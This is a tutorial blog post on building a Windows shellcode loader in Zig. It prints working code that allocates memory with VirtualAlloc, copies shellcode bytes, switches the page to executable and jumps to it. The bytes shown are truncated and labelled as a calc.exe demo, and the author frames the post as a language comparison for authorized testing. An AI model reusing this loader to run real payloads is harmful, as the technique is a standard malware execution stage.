---
title: "Using Zig to Gauge How Difficult It Is Compared to C/Rust for Offensive Security: Shellcode Loader PART 1"
image: "images/blog/calc_shellcode.png"
date: "2026-03-20"
excerpt: "Zig is turning out to be extremely effective for low-level security tooling. This article looks at how difficult it really is to use Zig instead of C or Rust when building simple offensive security tools. The example shows how easy it is to allocate memory, control sections, and execute shellcode in a way that is clean, minimal, and practical for real authorized security testing."
category: "Tool Development"
fetured: false
---

This write-up demonstrates how to execute shellcode in Zig on Windows. We'll cover memory allocation, protection manipulation, and execution - essential techniques for system programming and security research.

## Prerequisites

- Zig compiler (0.15.2)
- Windows OS (x64)
- Basic understanding of Windows API

## The Shellcode

First, let's store our shellcode. We'll use calc.exe shellcode for demonstration, stored in both `.rdata` (read-only) and `.data` (mutable) sections:

```zig
const win = @import("std").os.windows;
const std = @import("std");

// .data section - mutable
var R_DATA = [_]u8 {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    // ... (full shellcode bytes)
};

// .rdata section - read-only
const RO_DATA = [_]u8 {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    // ... (full shellcode bytes)
};
```

## Memory Allocation Constants

Define the Windows memory allocation constants:

```zig
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
```

## Windows API Declarations

Declare the necessary Windows API functions:

```zig
extern "kernel32" fn VirtualAlloc(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) callconv(.winapi) ?*anyopaque;

extern "kernel32" fn VirtualProtect(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *u32,
) callconv(.winapi) i32;

extern "kernel32" fn VirtualFree(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    dwFreeType: u32,
) callconv(.winapi) i32;
```

## Shellcode Execution Function

The core function that allocates memory, copies shellcode, and executes it:

```zig
fn execute_shellcode(shellcode: []const u8) !void {
    // 1. Allocate RW memory
    const exec_mem = VirtualAlloc(
        null,
        shellcode.len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    
    if (exec_mem == null) {
        return error.AllocationFailed;
    }
    
    // 2. Copy shellcode to allocated memory
    const dest = @as([*]u8, @ptrCast(exec_mem));
    @memcpy(dest[0..shellcode.len], shellcode);
    
    // 3. Change protection to RX
    var old_protect: u32 = 0;
    const protect_result = VirtualProtect(
        exec_mem,
        shellcode.len,
        PAGE_EXECUTE_READ,
        &old_protect,
    );
    
    if (protect_result == 0) {
        _ = VirtualFree(exec_mem, 0, 0x8000);
        return error.ProtectFailed;
    }
    
    // 4. Cast to function pointer and execute
    const func = @as(*const fn () callconv(.winapi) void, @ptrCast(exec_mem));
    func();
    
    // 5. Cleanup
    _ = VirtualFree(exec_mem, 0, 0x8000);
}
```

## Main Function

```zig
pub fn main() !void {
    // Execute from .rdata (read-only section)
    std.debug.print("[*] Executing from RO_DATA...\n", .{});
    try execute_shellcode(RO_DATA[0..]);
    
    // Optional: Execute from .data (mutable section)
    // try execute_shellcode(R_DATA[0..]);
}
```

## Build and Run

Compile with x64 target:

```bash
zig build-exe shellcode.zig -target x86_64-windows
```

Run the executable:
```bash
.\shellcode.exe
```

Expected result: Calculator launches.
![Screenshot: Base Station IP request](/images/blog/calc_shellcode.png)

## Key Points

1. **Memory Protection**: Shellcode cannot execute from `.rdata` or `.data` directly due to DEP. You must allocate executable memory with `VirtualAlloc`.

2. **Two-Stage Allocation**: Allocate with `PAGE_READWRITE` first, copy data, then change to `PAGE_EXECUTE_READ` - this follows the principle of least privilege.

3. **Slice Conversion**: Use `dest[0..shellcode.len]` to convert raw pointers to slices for `@memcpy`.

4. **Calling Convention**: Use `.winapi` (lowercase) for Windows API functions and shellcode execution.

5. **Error Handling**: Always check return values from Windows APIs. `VirtualAlloc` returns `null` on failure.

## Complete Example

The [complete code](https://github.com/0xi6r/Offensive_zig/blob/main/zig_shellcode_loader.zig) combines all sections above. When executed, it allocates memory, copies the shellcode, changes protection flags, and executes - launching calculator. 

## Conclusion
This is my attempt to see whether Zig can realistically replace C or Rust for the kind of tooling I build. There has been a lot of hype around it, so the goal here is simple: test it in real scenarios and see if it actually holds up.

So far, the experience has been better than expected. The language is simple, the binaries are clean, and low-level Windows work feels much easier than it does in C and less heavy than Rust.

If this keeps holding up in more complex projects, Zig will definitely become part of the workflow.
